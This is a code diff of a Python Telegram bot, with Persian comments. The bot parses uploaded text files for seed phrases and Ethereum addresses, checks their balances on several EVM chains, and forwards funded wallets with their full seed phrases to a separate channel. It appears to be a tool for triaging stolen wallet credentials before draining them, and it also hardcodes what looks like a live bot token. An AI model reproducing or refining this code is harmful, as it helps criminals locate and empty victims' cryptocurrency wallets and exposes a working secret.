@@ -1,40 +1,15 @@
 import os
 import re
 import asyncio
-import threading
-from flask import Flask
 from telegram import Update
 from telegram.ext import ApplicationBuilder, ContextTypes, MessageHandler, filters
 from web3 import Web3
 from keep_alive import keep_alive
 
-from flask import Flask, request
-from telegram import Update
-
-app = Flask(__name__)
-
-application = ApplicationBuilder().token(BOT_TOKEN).build()
-application.add_handler(
-    MessageHandler(filters.ChatType.CHANNEL & filters.Document.ALL, process_report_file)
-)
-@app.route(f"/{BOT_TOKEN}", methods=["POST"])
-def webhook():
-    update = Update.de_json(request.get_json(force=True), application.bot)
-    application.update_queue.put_nowait(update)
-    return "OK"
-@app.route('/')
-def home():
-    return "Bot is running"
-
-@app.route('/run')
-def run():
-    threading.Thread(target=lambda: asyncio.run(run_job())).start()
-    return "running"
-
-# --- تنظیمات ---
+# --- تنظیمات دقیق ---
 BOT_TOKEN = '8668017334:AAHMHyPg_LAlYtzlcggKGhBjbGHXNLspylk'
-SOURCE_CHANNEL_ID = '@rrxfq'
-REPORT_CHANNEL_ID = '@regroupmywallet'
+SOURCE_CHANNEL = '@rrxfq'           # کانالی که فایل‌ها در آن آپلود می‌شوند
+REPORT_CHANNEL_ID = '@regroupmywallet' # کانالی که گزارش‌ها به آن ارسال می‌شوند
 
 NETWORKS = {
     'ETH': 'https://eth.llamarpc.com',
@@ -44,124 +19,86 @@ NETWORKS = {
     'OP': 'https://mainnet.optimism.io'
 }
 
-# =========================
-# بررسی موجودی ولت‌ها
-# =========================
 def check_all_balances(address):
-    found_assets = []
+    results = {}
     for name, rpc in NETWORKS.items():
         try:
-            w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={'timeout': 5}))
+            w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={'timeout': 7}))
             checksum_addr = Web3.to_checksum_address(address.strip())
             bal_wei = w3.eth.get_balance(checksum_addr)
-            if bal_wei > 0:
-                amount = float(w3.from_wei(bal_wei, 'ether'))
-                found_assets.append({'network': name, 'amount': amount})
+            amount = float(w3.from_wei(bal_wei, 'ether'))
+            results[name] = amount
         except:
-            continue
-    return found_assets
+            results[name] = 0.0
+    return results
 
-# =========================
-# پردازش فایل گزارش
-# =========================
 async def process_report_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not update.channel_post or not update.channel_post.document:
+    # بررسی اینکه فایل حتماً از کانال سورس آمده باشد
+    if update.channel_post.chat.username != SOURCE_CHANNEL.replace('@', ''):
         return
 
     doc = update.channel_post.document
-    if not doc.file_name.endswith('.txt'):
+    if not doc or not doc.file_name.endswith('.txt'):
         return
 
-    file = await context.bot.get_file(doc.file_id)
-    content_bytes = await file.download_as_bytearray()
-    content = content_bytes.decode('utf-8', errors='ignore')
+    # ارسال پیام شروع پردازش در کانال گزارش
+    await context.bot.send_message(chat_id=REPORT_CHANNEL_ID, text=f"📥 فایل جدید در `{SOURCE_CHANNEL}` یافت شد.\n📄 نام فایل: `{doc.file_name}`\n⏳ در حال محاسبه موجودی کل...")
 
-    phrases = re.findall(r"Phrase:\s*(.*?)\s*(?:\[|Addr:|$)", content, re.DOTALL)
-    addresses = re.findall(r"Addr:\s*(0x[a-fA-F0-9]{40})", content)
+    try:
+        file = await context.bot.get_file(doc.file_id)
+        content_bytes = await file.download_as_bytearray()
+        content = content_bytes.decode('utf-8', errors='ignore')
 
-    wallets = list(zip(phrases, addresses))
+        addresses = re.findall(r"Addr:\s*(0x[a-fA-F0-9]{40})", content)
+        phrases = re.findall(r"Phrase:\s*(.*?)\s*(?:\[|Addr:|$)", content, re.DOTALL)
+        wallets = list(zip(phrases, addresses))
 
-    if not wallets:
-        await context.bot.send_message(
-            chat_id=REPORT_CHANNEL_ID,
-            text=f"❌ در فایل `{doc.file_name}` هیچ کیف پولی یافت نشد.",
-            parse_mode='Markdown'
-        )
-        return
+        if not wallets:
+            await context.bot.send_message(chat_id=REPORT_CHANNEL_ID, text=f"❌ در فایل `{doc.file_name}` آدرسی پیدا نشد.")
+            return
 
-    total_balance_all = 0.0
-    rich_details = ""
+        total_summary = {net: 0.0 for net in NETWORKS.keys()}
+        rich_details = ""
+        
+        for phrase, addr in wallets:
+            balances = check_all_balances(addr)
+            has_money = False
+            wallet_info = f"\n💎 **Rich Wallet:**\n🔑 `{phrase.strip()}`\n📍 `{addr}`\n"
+            
+            for net, amount in balances.items():
+                total_summary[net] += amount
+                if amount > 0:
+                    has_money = True
+                    wallet_info += f"   - {net}: `{amount:.6f}`\n"
+            
+            if has_money:
+                rich_details += wallet_info
 
-    for phrase, addr in wallets:
-        clean_phrase = phrase.strip().replace('\n', ' ')
-        assets = check_all_balances(addr)
+        # ساخت گزارش نهایی
+        report = f"📊 **گزارش نهایی فایل:** `{doc.file_name}`\n"
+        report += f"📁 منبع: {SOURCE_CHANNEL}\n"
+        report += f"🔢 تعداد کل ولت‌ها: {len(wallets)}\n"
+        report += "──────────────────\n"
+        report += "💰 **مجموع موجودی این فایل:**\n"
+        for net, total in total_summary.items():
+            report += f"   - {net}: `{total:.6f}`\n"
 
-        wallet_total = 0.0
+        await context.bot.send_message(chat_id=REPORT_CHANNEL_ID, text=report, parse_mode='Markdown')
 
-        if assets:
-            wallet_info = f"\n💎 **کیف پول دارای موجودی:**\n"
-            wallet_info += f"🔑 Phrase:\n`{clean_phrase}`\n"
-            wallet_info += f"📍 Address: `{addr}`\n"
-
-            for asset in assets:
-                wallet_total += asset['amount']
-                total_balance_all += asset['amount']
-                wallet_info += f"🌐 {asset['network']} → `{asset['amount']:.6f}`\n"
-
-            wallet_info += f"💰 مجموع این کیف: `{wallet_total:.6f}`\n"
-            wallet_info += "-------------------------\n"
-            rich_details += wallet_info
-
-    summary_msg = f"📂 **File:** `{doc.file_name}`\n"
-    summary_msg += f"🔢 تعداد کیف‌ها: {len(wallets)}\n"
-    summary_msg += f"💰 **مجموع کل همه کیف‌ها:** `{total_balance_all:.6f}`\n"
-
-    await context.bot.send_message(
-        chat_id=REPORT_CHANNEL_ID,
-        text=summary_msg,
-        parse_mode='Markdown'
-    )
-
-    if rich_details:
-        if len(rich_details) > 4000:
+        if rich_details:
+            # ارسال جزئیات ولت‌های پول‌دار
             for i in range(0, len(rich_details), 4000):
-                await context.bot.send_message(
-                    chat_id=REPORT_CHANNEL_ID,
-                    text=rich_details[i:i+4000],
-                    parse_mode='Markdown'
-                )
-        else:
-            await context.bot.send_message(
-                chat_id=REPORT_CHANNEL_ID,
-                text=rich_details,
-                parse_mode='Markdown'
-            )
+                await context.bot.send_message(chat_id=REPORT_CHANNEL_ID, text=rich_details[i:i+4000], parse_mode='Markdown')
 
-# =========================
-# اجرای خودکار همه فایل‌های کانال
-# =========================
-async def run_job():
-    print("شروع بررسی همه فایل‌ها...")
-    from telegram import Bot
+    except Exception as e:
+        print(f"Error: {e}")
 
-    bot = Bot(token=BOT_TOKEN)
-    updates = await bot.get_updates()  # آخرین آپدیت‌ها
-    for update in updates:
-        # فقط فایل‌های کانال
-        if getattr(update, "channel_post", None) and getattr(update.channel_post, "document", None):
-            # شبیه‌سازی ContextType
-            class DummyContext:
-                bot = bot
-            await process_report_file(update, DummyContext())
-    print("پایان بررسی")
-
-# =========================
-# اجرای اصلی
-# =========================
-if __name__ == "__main__":
+if __name__ == '__main__':
     keep_alive()
-
-    WEBHOOK_URL = "https://regroup-my-wallet.onrender.com/" + '8668017334:AAHMHyPg_LAlYtzlcggKGhBjbGHXNLspylk'
-    application.bot.set_webhook(WEBHOOK_URL)
-
-    app.run(host="0.0.0.0", port=10000)
+    application = ApplicationBuilder().token(BOT_TOKEN).build()
+    
+    # فیلتر کردن پیام‌ها: فقط پست‌های کانال که فایل (Document) دارند
+    channel_filter = filters.ChatType.CHANNEL & filters.Document.ALL
+    application.add_handler(MessageHandler(channel_filter, process_report_file))
+    
+    application.run_polling()
